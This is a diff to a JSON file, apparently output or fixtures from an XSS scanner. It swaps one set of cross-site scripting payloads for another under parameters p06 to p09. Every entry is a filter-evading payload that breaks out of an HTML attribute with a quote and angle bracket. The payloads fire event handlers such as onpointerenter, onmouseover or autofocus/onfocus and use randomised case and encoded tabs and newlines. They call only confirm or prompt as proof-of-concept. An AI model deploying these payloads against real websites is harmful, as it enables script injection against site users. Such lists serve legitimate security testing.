@@ -48,16 +48,16 @@
   {
     "payloads": [
       {
-        "payload": "\"><D3V%09oNpOintERENter+=+(prompt)``>v3dm0s"
+        "payload": "\"><a%09oNPointERENter%09=%09(confirm)()%0dx>v3dm0s"
       },
       {
-        "payload": "\"><A/+/ONmOUsEOver%09=%09confirm()>v3dm0s"
+        "payload": "\"><A%09ONPOinTerEnTER+=+(prompt)``>v3dm0s"
       },
       {
-        "payload": "\"><D3V%09ONMoUseoVer+=+a=prompt,a()%0dx>v3dm0s"
+        "payload": "\"><DeTAILS%09oNpOINterEntEr%0a=%0aconfirm()%0dx//"
       },
       {
-        "payload": "\"><D3v%09ONMOuseoVer+=+(confirm)()>v3dm0s"
+        "payload": "\"><html/+/onpoinTerEnter%0d=%0dconfirm()//"
       }
     ],
     "parameter": "p06"
@@ -65,16 +65,16 @@
   {
     "payloads": [
       {
-        "payload": "'><HTml%0aoNpoinTeRENter%0a=%0aa=prompt,a()%0dx>"
+        "payload": "'><htML%0dOnmousEOveR%0d=%0d[8].find(confirm)>"
       },
       {
-        "payload": "'><D3V%0dONPoINTerENtEr%0a=%0a(confirm)()%0dx>v3dm0s"
+        "payload": "'><A%09OnMOuSeoVer+=+confirm()>v3dm0s"
       },
       {
-        "payload": "'><D3V%0aoNmOuSeOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
+        "payload": "'><html%0aONPOiNterENTer%09=%09(confirm)()>"
       },
       {
-        "payload": "'><DETAIls%0aonTOGgLE+=+[8].find(confirm)%0dx//"
+        "payload": "'><d3v%09oNmOuSEOVeR%09=%09confirm()%0dx>v3dm0s"
       }
     ],
     "parameter": "p07"
@@ -82,16 +82,16 @@
   {
     "payloads": [
       {
-        "payload": "\"%09aUtoFocus%09OnFOcuS=\"confirm()"
+        "payload": "\"/+/auTofOCus/+/ONfOCuS=\"confirm()"
       },
       {
-        "payload": "\"%09aUtOFoCUS%09onFOcUS=\"(confirm)()"
+        "payload": "\"%0aAUtofOcuS%0aoNFoCUS=\"a=prompt,a()"
       },
       {
-        "payload": "\"%09aUTofoCUS%09OnfOcUS=\"(prompt)``"
+        "payload": "\"/+/autofOCus/+/ONFocUS=\"a=prompt,a()"
       },
       {
-        "payload": "\"%09AUTOFOCus%09onFOCUS=\"a=prompt,a()"
+        "payload": "\"%0daUtOfoCUs%0dOnFocUs=\"(prompt)``"
       }
     ],
     "parameter": "p08"
@@ -99,16 +99,16 @@
   {
     "payloads": [
       {
-        "payload": "'%0daUTOfOcus%0dONfocus='confirm()"
+        "payload": "'%09AUTOfocuS%09OnfOCUs='confirm()"
       },
       {
-        "payload": "'%09aUtofocuS%09OnfOcUs='confirm()"
+        "payload": "'%0dauTofOCus%0donfOcuS='[8].find(confirm)"
       },
       {
-        "payload": "'/+/AUtOFoCUS/+/ONfocuS='a=prompt,a()"
+        "payload": "'%0aautOfocus%0aonfocuS='[8].find(confirm)"
       },
       {
-        "payload": "'%0daUtOfOcuS%0dONfoCUs='a=prompt,a()"
+        "payload": "'/+/aUTofocUS/+/OnFOcus='confirm()"
       }
     ],
     "parameter": "p09"
